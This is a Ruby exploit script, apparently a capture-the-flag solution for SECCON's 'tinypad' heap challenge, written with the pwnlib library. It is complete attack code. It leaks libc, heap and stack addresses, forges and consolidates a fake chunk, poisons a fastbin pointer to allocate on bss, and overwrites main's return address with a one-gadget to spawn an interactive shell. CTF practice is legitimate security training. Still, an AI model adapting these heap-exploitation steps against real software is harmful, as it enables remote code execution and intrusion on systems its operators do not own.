#coding:ascii-8bit
require "pwnlib"  # https://github.com/Charo-IT/pwnlib

remote = ARGV[0] == "r"
if remote
  host = "tinypad.pwn.seccon.jp"
  port = 57463
  libc_offset = {
    "main_arena" => 0x3be760,
    "environ" => 0x5e9178,
    "one_gadget_rce" => 0xe66bd
  }
else
  host = "localhost"
  port = 54321
  libc_offset = {
    "main_arena" => 0x3be760,
    "environ" => 0x5e9178,
    "one_gadget_rce" => 0xe66bd
  }
end

offset = {
  "slots" => 0x602140,
}

class PwnTube
  def recv_until_prompt
    recv_until("(CMD)>>> ")
  end
end

def tube
  @tube
end

def add_memo(size, content)
  tube.recv_until_prompt
  tube.sendline("A")
  tube.recv_until("(SIZE)>>> ")
  tube.sendline("#{size}")
  tube.recv_until("(CONTENT)>>> ")
  tube.sendline(content)
end

def delete_memo(index)
  tube.recv_until_prompt
  tube.sendline("D")
  tube.recv_until("(INDEX)>>> ")
  tube.sendline("#{index}")
end

def edit_memo(index, content)
  tube.recv_until_prompt
  tube.sendline("E")
  tube.recv_until("(INDEX)>>> ")
  tube.sendline("#{index}")
  tube.recv_until("(CONTENT)>>> ")
  tube.sendline(content)
  tube.recv_until("(Y/n)>>> ")
  tube.sendline("Y")
end

PwnTube.open(host, port) do |t|
  @tube = t

  puts "[*] leak libc base"
  add_memo(256, "AAAAAAAA")
  add_memo(256, "AAAAAAAA")
  add_memo(256, "AAAAAAAA")
  add_memo(256, "AAAAAAAA")
  delete_memo(3)
  tube.recv_until("INDEX: 3")
  libc_base = tube.recv_capture(/CONTENT: (.{6})/m)[0].ljust(8, "\0").unpack("Q")[0] - libc_offset["main_arena"] - 0x58
  puts "libc base = 0x%x" % libc_base

  puts "[*] leak heap base"
  delete_memo(1)
  heap_base = tube.recv_capture(/CONTENT: (.+)\n/m)[0].ljust(8, "\0").unpack("Q")[0] - 0x220
  puts "heap base = 0x%x" % heap_base
  delete_memo(2)
  delete_memo(4)




  puts "[*] create fake chunk"
  add_memo(0xf8, "AAAAAAAA")
  add_memo(0xf8, "AAAAAAAA")
  add_memo(0xf8, "AAAAAAAA")
  add_memo(0x31, "AAAAAAAA")
  delete_memo(1)
  
  payload = ""
  payload << "\0" * 0xd0
  payload << [0, 0x21].pack("Q*")  # size
  payload << [heap_base + 0xe0, heap_base + 0xe0].pack("Q*")  # fd, bk
  payload << [0x20].pack("Q")  # prev_size
  add_memo(0xf8, payload)

  puts "[*] consolidate fake chunk"
  delete_memo(2)

  puts "[*] overlap chunks"
  payload = ""
  payload << [0].pack("Q") * 3
  payload << [0x121].pack("Q")  # size
  add_memo(payload.length, payload)

  puts "[*] free fake fastbin chunk"
  delete_memo(1)
  delete_memo(2)

  puts "[*] overwrite fastbin chunk->fd"
  payload = ""
  payload << "\0" * 0xd0
  payload << [0, 0x31].pack("Q*")
  payload << [offset["slots"] + 0x28].pack("Q")  # fd
  add_memo(0xf8, payload)

  puts "[*] allocate a chunk on bss"
  delete_memo(1)
  add_memo(0x28, "AAAAAAAA")
  add_memo(0x28, [libc_base + libc_offset["environ"]].pack("Q"))

  puts "[*] leak stack address"
  tube.recv_until("INDEX: 4")
  environ = tube.recv_capture(/CONTENT: (.+)\n/m)[0].ljust(8, "\0").unpack("Q")[0]
  puts "environ = 0x%x" % environ

  puts "[*] overwrite return address of main"
  edit_memo(2, [environ - 0xf0].pack("Q"))
  edit_memo(4, [libc_base + libc_offset["one_gadget_rce"]].pack("Q"))

  puts "[*] launch shell"
  tube.recv_until_prompt
  tube.sendline("Q")
  tube.recv

  tube.interactive
end